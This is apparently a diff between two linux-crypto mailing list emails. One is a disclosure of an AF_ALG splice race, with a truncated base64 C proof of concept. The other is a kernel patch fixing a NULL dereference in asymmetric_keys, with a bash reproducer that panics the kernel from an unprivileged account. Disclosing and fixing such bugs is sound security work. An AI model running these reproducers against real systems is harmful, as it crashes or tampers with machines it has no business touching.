@@ -1,212 +1,185 @@
-Received: from mail-07.mail-europe.com (mail-07.mail-europe.com [188.165.51.139])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-dy1-f182.google.com (mail-dy1-f182.google.com [74.125.82.182])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 071FE223DE5
-	for <linux-crypto@vger.kernel.org>; Sat,  2 May 2026 15:47:20 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=188.165.51.139
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5D9BB231A21
+	for <linux-crypto@vger.kernel.org>; Sat,  2 May 2026 16:33:57 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.182
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1777736844; cv=none; b=fFtypgbndsHhxCVnvNtGsbKIimrbPuDRlmn0TE3SZECNZCOMkT9eZoldE8nArPC7ZMAEnBYxi6qnsvXG9JZp07BY4/DDE9USaqynB9cLz9Ae/760+kWrXC6w1702e5iPYhozGv782urat292o3K68DJIrs7YzLXM0eXAbNgOoSA=
+	t=1777739638; cv=none; b=l8Be3IPoW7YFYtcltnFxO71O6CVoHxSyZGukFl8ItAbhY5FqyoxCeDw1+HzvnhfkCGgwcMg7LKdc+khjnx1KjdkziWHXujr6JgqnNldyzimqBFruVwLvMAC1qtyML9cTh22PBIxRRh9iG8PMvAyIfl48vVQkOk8F6SrzwmrlKKw=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1777736844; c=relaxed/simple;
-	bh=npaTwN3bFqF9dc7RiHO4BAyb+tm0OGhOHy7zaPgFTyw=;
-	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=IdRZV+uMieuoglVVO6iSW8Il31nwUTgNNtv64/PZ1qPkEhiu0sXGA1Yaijj9i2ZICUg7Z2XP8M9ZU7YgvAobaWSOCToc3JRGULkKf+bSk1sSI70KRTN0AfgHtkABoz6ubQzrHSVN+4M8IoWbVZpK7f6Zg85VVI3N4mmumdrHH/I=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai; spf=pass smtp.mailfrom=innora.ai; dkim=pass (2048-bit key) header.d=innora.ai header.i=@innora.ai header.b=oZ1SGUsC; arc=none smtp.client-ip=188.165.51.139
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=innora.ai
+	s=arc-20240116; t=1777739638; c=relaxed/simple;
+	bh=u+xQMtGqXsh+gMATDVhNpZ2LVrpcAWd4ZqvM//zvUto=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=uVQWOn5DSc3X3lIXGRMHZTwvpGYXkgTOQ92gvmvdlpAOpWC7Vul20Il5BWbbwv3L++ATCz0TzwWr7WnXCcgXtSFH6++CdXqWs+ToHthZds2IfrsU9Hz4gxtNsD0IjaO/nDY17NmdD+gckapMJVQS2oUT3YfOzhiy2QLdTET1/3Q=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=gTRf6LOt; arc=none smtp.client-ip=74.125.82.182
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=innora.ai header.i=@innora.ai header.b="oZ1SGUsC"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=innora.ai;
-	s=protonmail2; t=1777736830; x=1777996030;
-	bh=kg4nJMAp540uyd1Y/WiQhbZcKSX89OHO+bWSr/VEe3E=;
-	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
-	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
-	b=oZ1SGUsCib7W9foQhx+pDTNYPOaRNPOETY0k+q8Jrhj7rwJi0yPbymRXL/PXlWWXw
-	 nKYCxQ3i9yqPKSr5XBIW6/3iwTofkved8+6UiVkSqlV9mXuHtZfPpLKndCzQ80Sj0j
-	 6XYnIeVbO70iarIoHZEvg0rD7usAMQ2xc5PN3lKfRxXn4zYqT1sKj5RYGaoyYgrpLW
-	 SoIx9TYLIRUYDup2hbkCVDgKFM9kFFuIFFKLZ0Cukgm88MdmLwk4BCBuySORs8TUh2
-	 WoNZfvzOOLLJnyTiavjkv4n5ykBFO4J04Js/R7XTIxn1cFWE++bMoStNnmVKo3EyQW
-	 5U9KZUrpxlA4g==
-Date: Sat, 02 May 2026 15:47:03 +0000
-To: linux-crypto@vger.kernel.org
-From: Feng Ning <feng@innora.ai>
-Cc: herbert@gondor.apana.org.au
-Subject: [Possible vulnerability] crypto/af_alg: extract_bvec_to_sg() retains spliced pipe pages in TX SGL without sendpage_ok() check
-Message-ID: <afYcc-tZFwvZZo76@ans-MacBook-Pro.local>
-Feedback-ID: 140578448:user:proton
-X-Pm-Message-ID: 2979b44d91a4053fdb80aa8d0c2fb98096a19678
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="gTRf6LOt"
+Received: by mail-dy1-f182.google.com with SMTP id 5a478bee46e88-2ef84d016d9so2453712eec.0
+        for <linux-crypto@vger.kernel.org>; Sat, 02 May 2026 09:33:57 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1777739636; x=1778344436; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to;
+        bh=U8qblfI6Sw5tc14k/l+jvxt6BzLYWjeb+CuRiMdqxKY=;
+        b=gTRf6LOtqDrY1/FVZ2ultTJVr4smb2ry2oD9B0vXfGlhz+raX2VMZ+7nazAjbW3XQW
+         EayWEFHW8KMNlJIHvlO0Q58c9iz0/jM7ABkSdAbDX10yCMlZHI3BXPGlVYSeBhx4R9wU
+         U2u/mvt9gienSmNSX0ClnRedcNi8EDPGcWrwRv26BPRoynmwhVTYJTkAAxZpt4NC1n1I
+         2jrBOi4tuTgPcmr3Qa/3ENnwWhUpx/8JPsrkYVA5aK/gzXRfi/kipj9ItCQNijbKRDan
+         XapvJrADNBAIKAes/rYyz03mEKp8TMNAfV8CnQoeTAZUey9ZVpgcx5IwhMXslNGC/QYP
+         5VOQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1777739636; x=1778344436;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=U8qblfI6Sw5tc14k/l+jvxt6BzLYWjeb+CuRiMdqxKY=;
+        b=swRIv+9axRpkiWAE4ps/fsc01RlSSz156jEhBQLSfx7Reod9YJ6fYdpByCk2NfMOC5
+         rQVb0gtprQgZfjJCFr7L0TqIuy68d1nbARnZ/dKHRdv97rFzV8Vlqsm+38OpoE8yk8ko
+         bcA+q3+Of2V4ShS0IRnNItdomPqe+RH0utIYLrjlpqWHGk5MThGWxzC94fKkxoJmcE0j
+         HhT7Z4ILhtSv+opi5G+TkegIAwRp7x0h/YigHkSUuHm9mHhqbJHwoG+jeB0GY2Ty1xMR
+         vdETQ4odUlvKDPaJjAYUSzR9Zn/wuy9XOGB/xBjQgqpCjz0AppQgb809305XJqrXoP+A
+         i5/A==
+X-Forwarded-Encrypted: i=1; AFNElJ8HWilaeYajdnDJlp3xnkCVr03WtjL4teyoA9zjNIeelb8FHxKQGB2/2c2YlbyKKgk1z/21zCizsfzVErQ=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yy9NJ6yFH4PgFt7eeyNPvMx5FyWj/4VbmXpsxTcSecQbtr/zkar
+	Ki/JFoM4+cW+i8IS9xTtoUM8JuXxXoq9gvqoG8n8c0WwVTJrIEBclAFT
+X-Gm-Gg: AeBDiet8eatxP4LEYI0xJqTbB/5wSjkt4pcOek7VgBaOt4IqqPgQaEm2TwiN5WetAnR
+	iB4jsNpEco9AgnIbHlmBScjQE5/eFmhT6t4QEzwZEWy0t+1aIeK3NtcMaiFrokUi5GAwmCOpHeU
+	3ZqgHsoqAUkuCxt4w3SKe0NwTL+1ATEuyX4cN39513L4Q4q/G5k3RdmG/usbaA9COo9e+VmFFn0
+	b6qlJP3Xp66MuUlRZ9gNMvt3eLdCyJXjCHVuUxLorBjLAeUxIPrU5fbZ5Vs2NuBe/PBs1zOruti
+	OZET8KGu65T6TlzYG061+xHYI4ckWnf19Krv6YbAsm/CA2T0Q5Wo9hjbmHgRkbNigSp9vRQV48j
+	LAEQ8er4v0ipRfbh0LWlm8nkVhc/1PdrkRSyaogGkePvgXMa3AEmW3KC2DWW4GsnxnQkdvSfT4P
+	sLEsIm/hwEd/hz+tIYe/6oVcE1wiZ5wi1SkRUp6bkOS90/7oSp1/v0UkEAEjGzQRL/911TVhpMy
+	YQj14SQGzDu4HbKLfApZBI0YbdcJDw=
+X-Received: by 2002:a05:7300:f194:b0:2cc:600d:2ffa with SMTP id 5a478bee46e88-2efb999d860mr1735093eec.16.1777739636548;
+        Sat, 02 May 2026 09:33:56 -0700 (PDT)
+Received: from efaec68ba852.tailc0aff1.ts.net ([206.206.192.132])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2ee3b29b1a4sm9008804eec.18.2026.05.02.09.33.54
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sat, 02 May 2026 09:33:55 -0700 (PDT)
+From: Weiming Shi <bestswngs@gmail.com>
+To: David Howells <dhowells@redhat.com>,
+	Lukas Wunner <lukas@wunner.de>,
+	Ignat Korchagin <ignat@linux.win>,
+	Herbert Xu <herbert@gondor.apana.org.au>,
+	"David S . Miller" <davem@davemloft.net>
+Cc: Jarkko Sakkinen <jarkko@kernel.org>,
+	keyrings@vger.kernel.org,
+	linux-crypto@vger.kernel.org,
+	Xiang Mei <xmei5@asu.edu>,
+	Weiming Shi <bestswngs@gmail.com>
+Subject: [PATCH v2] asymmetric_keys: check asymmetric_key_ids() for NULL before dereference
+Date: Sat,  2 May 2026 09:33:29 -0700
+Message-ID: <20260502163328.696098-2-bestswngs@gmail.com>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: linux-crypto@vger.kernel.org
 List-Id: <linux-crypto.vger.kernel.org>
 List-Subscribe: <mailto:linux-crypto+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-crypto+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: multipart/mixed;
- boundary="b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g"
+Content-Transfer-Encoding: 8bit
 
---b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+asymmetric_key_ids() returns key->payload.data[asym_key_ids], which can
+be NULL for keys parsed by the PKCS#8 parser (pkcs8_parser.c explicitly
+stores NULL in prep->payload.data[asym_key_ids]).
 
-[Possible vulnerability] crypto/af_alg: extract_bvec_to_sg() retains splice=
-d pipe pages in TX SGL without sendpage_ok() check
+key_or_keyring_common() in restrict.c and find_asymmetric_key() in
+asymmetric_type.c both dereference this return value without checking
+for NULL. An unprivileged user can trigger a NULL pointer dereference
+in key_or_keyring_common() by creating a PKCS#8 key, restricting a
+keyring with key_or_keyring:<pkcs8_serial>, and adding an X.509 cert
+to the restricted keyring. CONFIG_PKCS8_PRIVATE_KEY_PARSER=y is
+required.
 
-Hello kernel security team & linux-crypto,
+The following bash script can reproduce the issue:
 
-This is a follow-up to CVE-2026-31431 ("Copy Fail") fixed by
+  #!/bin/bash
+  modprobe pkcs8_key_parser 2>/dev/null
+  openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:1024 \
+      -out /tmp/poc.pem 2>/dev/null
+  openssl pkcs8 -topk8 -nocrypt -in /tmp/poc.pem \
+      -outform DER -out /tmp/poc.p8
+  openssl req -new -x509 -key /tmp/poc.pem -outform DER \
+      -out /tmp/poc.der -days 365 -subj "/CN=Test" \
+      -addext "subjectKeyIdentifier=hash" \
+      -addext "authorityKeyIdentifier=keyid:always" 2>/dev/null
+  PKCS8_ID=$(keyctl padd asymmetric pkcs8key @s < /tmp/poc.p8)
+  KR=$(keyctl newring test_kr @s)
+  keyctl restrict_keyring $KR asymmetric "key_or_keyring:$PKCS8_ID"
+  keyctl padd asymmetric trigger $KR < /tmp/poc.der
+  rm -f /tmp/poc.pem /tmp/poc.p8 /tmp/poc.der
 
-    a664bf3d603d crypto: algif_aead - Revert to operating out-of-place
+ Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000
+ KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
+ RIP: 0010:key_or_keyring_common (crypto/asymmetric_keys/restrict.c:205 crypto/asymmetric_keys/restrict.c:279)
+ Call Trace:
+  <TASK>
+  __key_create_or_update (security/keys/key.c:884)
+  key_create_or_update (security/keys/key.c:1021)
+  __do_sys_add_key (security/keys/keyctl.c:134)
+  do_syscall_64 (arch/x86/entry/common.c:52 arch/x86/entry/common.c:83)
+  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
+  </TASK>
+ Kernel panic - not syncing: Fatal exception
 
-We have identified that the underlying primitive =E2=80=94 extract_iter_to_=
-sg()
-with ITER_BVEC backend in lib/scatterlist.c =E2=80=94 does not perform a
-sendpage_ok() / page->mapping filter when transferring pipe pages
-into a permanent scatterlist. This makes the AF_ALG path
-(crypto/af_alg.c MSG_SPLICE_PAGES branch) retain attacker-controlled
-pipe pages in the TX SGL until recvmsg(), creating a TOCTOU race window
-during which crypto subsystem reads of the SGL observe attacker-mutated
-page content.
+Add a NULL check in find_asymmetric_key(), mirroring the existing
+pattern in asymmetric_match_key_ids() and asymmetric_key_describe().
+In key_or_keyring_common(), skip the trusted key matching when it
+has no key IDs and fall through to the check_dest path.
 
-In contrast, skb_splice_from_iter() (net/core/skbuff.c) does include a
-WARN_ON_ONCE(!sendpage_ok(page)) check before persisting the page.
+Fixes: 7d30198ee24f ("keys: X.509 public key issuer lookup without AKID")
+Reported-by: Xiang Mei <xmei5@asu.edu>
+Signed-off-by: Weiming Shi <bestswngs@gmail.com>
+---
+v2: add bash reproducer to commit message (Ignat)
 
-Source anchors (verified against mainline HEAD 08d0d3466664):
-  - lib/scatterlist.c: extract_bvec_to_sg() at lines 1166-1205
-  - crypto/af_alg.c: MSG_SPLICE_PAGES branch at lines 1020-1040
-  - crypto/algif_skcipher.c: skcipher_request_set_crypt() at line 161
+ crypto/asymmetric_keys/asymmetric_type.c | 2 ++
+ crypto/asymmetric_keys/restrict.c        | 9 +++++++--
+ 2 files changed, 9 insertions(+), 2 deletions(-)
 
-PoC results (lab-only, attached as poc-k02-splice-afalg.c):
-  - Tested kernel: Linux 6.8.0-110-generic (Ubuntu 24.04, x86_64)
-  - Algorithm: skcipher / "ecb(aes)"
-  - Race: vmsplice(SPLICE_F_GIFT) -> splice -> AF_ALG opfd; race writer
-    XOR-flips page bytes between splice() and recvmsg()
-  - Result: 5 stable runs, mean 5.6 race-affected ciphertexts per
-    500 rounds (1.1% race hit rate)
-  - Build: gcc -pthread -o poc poc-k02-splice-afalg.c
-  - Run:   ./poc
-
-Independent inner-template audit (44 crypto/*.c templates and
-drivers/crypto/) confirms that under the post-a664bf3d603d state, no
-inner template sub-path writes back to req->src in user-space flows.
-Severity is therefore confined to ciphertext integrity (race window)
-under default software crypto. Hardware crypto offload paths
-(CAAM/OMAP/Atmel/CAAM) gate in-place on req->src =3D=3D req->dst, which
-the current algif_* surface no longer satisfies. Privilege escalation
-under the software path was not demonstrated.
-
-Suggested mitigation:
-  - Add sendpage_ok() check (or stronger: page->mapping =3D=3D NULL ||
-    PageAnon(page)) inside extract_bvec_to_sg() in lib/scatterlist.c,
-    optionally behind an iov_iter_extraction_t flag if performance
-    sensitive.
-  - Alternative: copy pipe pages instead of retaining via get_page()
-    for the AF_ALG callsites specifically.
-
-We are not requesting a CVE for this report at this time and welcome
-your assessment of severity.
-
-Reporter:
-  Feng Ning <feng@innora.ai>
-  PGP fingerprint: 7D1A285EF3FE907C1594FA292E73300F628AE89E
-  (please encrypt any sensitive reply against this key)
-
-Best regards,
-Feng Ning
-
---b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g
-Content-Type: text/plain; charset=utf-8; name=poc-k02-splice-afalg.c
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename=poc-k02-splice-afalg.c
-
-LyoNCiAqIEstMDIgUG9DIHYyOiBBRl9BTEcgc3BsaWNlIFRPQ1RPVSDigJQgc2ltcGxpZmllZCwg
-c2luZ2xlLW9wZmQNCiAqDQogKiBUaGVvcnk6IHZtc3BsaWNlKFNQTElDRV9GX0dJRlQpIHB1dHMg
-dXNlciBwYWdlIGludG8gcGlwZS4NCiAqICAgICAgICAgc3BsaWNlKHBpcGUgLT4gQUZfQUxHIG9w
-ZmQpIGV4dHJhY3RzIHBpcGUgcGFnZSBpbnRvIFNHTA0KICogICAgICAgICB2aWEgZXh0cmFjdF9p
-dGVyX3RvX3NnKCkgLT4gZ2V0X3BhZ2UoKS4NCiAqICAgICAgICAgSWYgcGFnZSBpcyByZXRhaW5l
-ZCAobm90IGNvcGllZCksIHJhY2Ugd3JpdGVyIG1vZGlmeWluZw0KICogICAgICAgICB0aGUgcGFn
-ZSBiZXR3ZWVuIHNwbGljZSgpIGFuZCByZWN2bXNnKCkgY2hhbmdlcyBjaXBoZXJ0ZXh0Lg0KICov
-DQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRs
-aWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRl
-IDxmY250bC5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvdWlvLmg+
-DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNsdWRlIDxsaW51eC9pZl9hbGcuaD4NCiNpbmNs
-dWRlIDxwdGhyZWFkLmg+DQojaW5jbHVkZSA8c3RkaW50Lmg+DQoNCiNkZWZpbmUgQkxPQ0sgMTYN
-Cg0Kc3RhdGljIGludCBhZmFsZ19zZXR1cChjb25zdCBjaGFyICpuYW1lLCBjb25zdCB1bnNpZ25l
-ZCBjaGFyICprZXksIGludCBrbGVuKQ0Kew0KICAgIGludCB0Zm0gPSBzb2NrZXQoQUZfQUxHLCBT
-T0NLX1NFUVBBQ0tFVCwgMCk7DQogICAgaWYgKHRmbSA8IDApIHsgcGVycm9yKCJzb2NrZXQiKTsg
-cmV0dXJuIC0xOyB9DQoNCiAgICBzdHJ1Y3Qgc29ja2FkZHJfYWxnIHNhID0geyAuc2FsZ19mYW1p
-bHkgPSBBRl9BTEcsIC5zYWxnX3R5cGUgPSAic2tjaXBoZXIiIH07DQogICAgc3RybmNweSgoY2hh
-ciopc2Euc2FsZ19uYW1lLCBuYW1lLCBzaXplb2Yoc2Euc2FsZ19uYW1lKS0xKTsNCiAgICBpZiAo
-YmluZCh0Zm0sIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2EsIHNpemVvZihzYSkpIDwgMCkgew0KICAg
-ICAgICBwZXJyb3IoImJpbmQiKTsgY2xvc2UodGZtKTsgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBp
-ZiAoc2V0c29ja29wdCh0Zm0sIFNPTF9BTEcsIEFMR19TRVRfS0VZLCBrZXksIGtsZW4pIDwgMCkg
-ew0KICAgICAgICBwZXJyb3IoInNldHNvY2tvcHQgS0VZIik7IGNsb3NlKHRmbSk7IHJldHVybiAt
-MTsNCiAgICB9DQogICAgcmV0dXJuIHRmbTsNCn0NCg0Kc3RhdGljIHZvaWQgZW5jcnlwdF9yZWYo
-aW50IG9wZmQsIGNvbnN0IHVuc2lnbmVkIGNoYXIgKmluLA0KICAgICAgICAgICAgICAgICAgICAg
-ICAgdW5zaWduZWQgY2hhciAqb3V0LCBzaXplX3QgbGVuKQ0Kew0KICAgIHN0cnVjdCBpb3ZlYyBp
-b3YgPSB7ICh2b2lkKilpbiwgbGVuIH07DQogICAgc3RydWN0IG1zZ2hkciBtc2cgPSB7IC5tc2df
-aW92ID0gJmlvdiwgLm1zZ19pb3ZsZW4gPSAxIH07DQogICAgaWYgKHNlbmRtc2cob3BmZCwgJm1z
-ZywgMCkgIT0gKHNzaXplX3QpbGVuKSB7IHBlcnJvcigic2VuZG1zZyByZWYiKTsgcmV0dXJuOyB9
-DQogICAgaW92Lmlvdl9iYXNlID0gb3V0OyBpb3YuaW92X2xlbiA9IGxlbjsNCiAgICBpZiAocmVj
-dm1zZyhvcGZkLCAmbXNnLCAwKSAhPSAoc3NpemVfdClsZW4pIHsgcGVycm9yKCJyZWN2bXNnIHJl
-ZiIpOyB9DQp9DQoNCnN0YXRpYyB2b2xhdGlsZSBpbnQgcmFjZV9nbzsNCg0Kc3RhdGljIHZvaWQg
-KnJhY2VfdGhyZWFkKHZvaWQgKmFyZykNCnsNCiAgICB1bnNpZ25lZCBjaGFyICpwYWdlID0gYXJn
-Ow0KICAgIHdoaWxlICghcmFjZV9nbykgX19zeW5jX3N5bmNocm9uaXplKCk7DQogICAgZm9yIChp
-bnQgaSA9IDA7IGkgPCA1MDAwMDsgaSsrKSB7DQogICAgICAgIHBhZ2VbMF0gXj0gMHhGRjsNCiAg
-ICAgICAgX19zeW5jX3N5bmNocm9uaXplKCk7DQogICAgfQ0KICAgIHJldHVybiBOVUxMOw0KfQ0K
-DQppbnQgbWFpbih2b2lkKQ0Kew0KICAgIHVuc2lnbmVkIGNoYXIga2V5W0JMT0NLXSA9IHsweDAs
-MHgxLDB4MiwweDMsMHg0LDB4NSwweDYsMHg3LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAweDgsMHg5LDB4QSwweEIsMHhDLDB4RCwweEUsMHhGfTsNCiAgICB1bnNpZ25lZCBjaGFy
-IHB0W0JMT0NLXSAgPSB7MHgwMCwweDExLDB4MjIsMHgzMywweDQ0LDB4NTUsMHg2NiwweDc3LA0K
-ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDg4LDB4OTksMHhBQSwweEJCLDB4Q0Ms
-MHhERCwweEVFLDB4RkZ9Ow0KICAgIHVuc2lnbmVkIGNoYXIgcmVmW0JMT0NLXSwgYnVmW0JMT0NL
-XTsNCiAgICBpbnQgdGZtLCBvcGZkLCBwaXBlZmRbMl07DQoNCiAgICBwcmludGYoIlsrXSBLLTAy
-IFBvQzogQUZfQUxHIHNwbGljZSBUT0NUT1VcbiIpOw0KDQogICAgdGZtID0gYWZhbGdfc2V0dXAo
-ImVjYihhZXMpIiwga2V5LCBCTE9DSyk7DQogICAgaWYgKHRmbSA8IDApIHJldHVybiAxOw0KDQog
-ICAgLyogcmVmZXJlbmNlIGNpcGhlcnRleHQgdmlhIG5vcm1hbCBzZW5kbXNnL3JlY3Ztc2cgKi8N
-CiAgICBvcGZkID0gYWNjZXB0KHRmbSwgTlVMTCwgMCk7DQogICAgaWYgKG9wZmQgPCAwKSB7IHBl
-cnJvcigiYWNjZXB0Iik7IHJldHVybiAxOyB9DQogICAgZW5jcnlwdF9yZWYob3BmZCwgcHQsIHJl
-ZiwgQkxPQ0spOw0KICAgIHByaW50ZigiWytdIFJlZmVyZW5jZSBjaXBoZXJ0ZXh0IGNvbXB1dGVk
-XG4iKTsNCiAgICBjbG9zZShvcGZkKTsNCg0KICAgIC8qIGFsbG9jYXRlIHBhZ2UtYWxpZ25lZCBi
-dWZmZXIgKi8NCiAgICB1bnNpZ25lZCBjaGFyICpwYWdlID0gbW1hcChOVUxMLCA0MDk2LCBQUk9U
-X1JFQUR8UFJPVF9XUklURSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNQVBfUFJJ
-VkFURXxNQVBfQU5PTllNT1VTLCAtMSwgMCk7DQogICAgaWYgKHBhZ2UgPT0gTUFQX0ZBSUxFRCkg
-eyBwZXJyb3IoIm1tYXAiKTsgcmV0dXJuIDE7IH0NCg0KICAgIGlmIChwaXBlKHBpcGVmZCkgPCAw
-KSB7IHBlcnJvcigicGlwZSIpOyByZXR1cm4gMTsgfQ0KDQogICAgaW50IGhpdHMgPSAwLCByb3Vu
-ZHMgPSA1MDA7DQogICAgZm9yIChpbnQgciA9IDA7IHIgPCByb3VuZHM7IHIrKykgew0KICAgICAg
-ICBtZW1jcHkocGFnZSwgcHQsIEJMT0NLKTsNCg0KICAgICAgICBvcGZkID0gYWNjZXB0KHRmbSwg
-TlVMTCwgMCk7DQogICAgICAgIGlmIChvcGZkIDwgMCkgY29udGludWU7DQoNCiAgICAgICAgLyog
-dm1zcGxpY2U6IHVzZXIgcGFnZSAtPiBwaXBlICh6ZXJvLWNvcHkgd2l0aCBTUExJQ0VfRl9HSUZU
-KSAqLw0KICAgICAgICBzdHJ1Y3QgaW92ZWMgaW92ID0geyBwYWdlLCBCTE9DSyB9Ow0KICAgICAg
-ICBpZiAodm1zcGxpY2UocGlwZWZkWzFdLCAmaW92LCAxLCBTUExJQ0VfRl9HSUZUKSA8IDApIHsN
-CiAgICAgICAgICAgIC8qIEdpZnQgZmFpbGVkIChwYWdlIG5vdCBzdWl0YWJsZSksIGRvIGNvcHkg
-Ki8NCiAgICAgICAgICAgIGlmICh2bXNwbGljZShwaXBlZmRbMV0sICZpb3YsIDEsIDApIDwgMCkg
-ew0KICAgICAgICAgICAgICAgIHBlcnJvcigidm1zcGxpY2UiKTsgY2xvc2Uob3BmZCk7IGNvbnRp
-bnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgLyogc3BsaWNlOiBwaXBl
-IC0+IEFGX0FMRyAoc2VuZG1zZyBlcXVpdmFsZW50KSAqLw0KICAgICAgICBpZiAoc3BsaWNlKHBp
-cGVmZFswXSwgTlVMTCwgb3BmZCwgTlVMTCwgQkxPQ0ssDQogICAgICAgICAgICAgICAgICAgU1BM
-SUNFX0ZfTU9WRSB8IFNQTElDRV9GX01PUkUpIDwgMCkgew0KICAgICAgICAgICAgcGVycm9yKCJz
-cGxpY2UiKTsgY2xvc2Uob3BmZCk7IGNvbnRpbnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgLyog
-U3RhcnQgcmFjZSB3cml0ZXIgKi8NCiAgICAgICAgcmFjZV9nbyA9IDA7DQogICAgICAgIHB0aHJl
-YWRfdCB0aHI7DQogICAgICAgIHB0aHJlYWRfY3JlYXRlKCZ0aHIsIE5VTEwsIHJhY2VfdGhyZWFk
-LCBwYWdlKTsNCiAgICAgICAgcmFjZV9nbyA9IDE7ICAvKiBsZXQgd3JpdGVyIHN0YXJ0IGFmdGVy
-IHNwbGljZSwgYmVmb3JlIHJlY3Ztc2cgKi8NCg0KICAgICAgICAvKiByZWN2bXNnOiByZWFkIGNp
-cGhlcnRleHQgKi8NCiAgICAgICAgc3RydWN0IGlvdmVjIGlvdl9yeCA9IHsgYnVmLCBCTE9DSyB9
-Ow0KICAgICAgICBzdHJ1Y3QgbXNnaGRyIG1zZyA9IHsgLm1zZ19pb3YgPSAmaW92X3J4LCAubXNn
-X2lvdmxlbiA9IDEgfTsNCiAgICAgICAgc3NpemVfdCBuID0gcmVjdm1zZyhvcGZkLCAmbXNnLCAw
-KTsNCg0KICAgICAgICBwdGhyZWFkX2pvaW4odGhyLCBOVUxMKTsNCiAgICAgICAgY2xvc2Uob3Bm
-ZCk7DQoNCiAgICAgICAgaWYgKG4gPT0gQkxPQ0sgJiYgbWVtY21wKGJ1ZiwgcmVmLCBCTE9DSykg
-IT0gMCkgew0KICAgICAgICAgICAgaGl0cysrOw0KICAgICAgICAgICAgaWYgKGhpdHMgPD0gMykg
-ew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyFdIFJPVU5EICVkOiBNSVNNQVRDSCFcbiIsIHIp
-Ow0KICAgICAgICAgICAgICAgIHByaW50ZigiICByZWY6ICIpOyBmb3IoaW50IGk9MDtpPEJMT0NL
-O2krKykgcHJpbnRmKCIlMDJ4IixyZWZbaV0pOyBwcmludGYoIlxuIik7DQogICAgICAgICAgICAg
-ICAgcHJpbnRmKCIgIGdvdDogIik7IGZvcihpbnQgaT0wO2k8QkxPQ0s7aSsrKSBwcmludGYoIiUw
-MngiLGJ1ZltpXSk7IHByaW50ZigiXG4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAg
-IH0NCg0KICAgIHByaW50ZigiWytdICVkLyVkIHJvdW5kcywgJWQgVE9DVE9VIGhpdHNcbiIsIHJv
-dW5kcywgcm91bmRzLCBoaXRzKTsNCiAgICBwcmludGYoIlsrXSBWZXJkaWN0OiAlc1xuIiwgaGl0
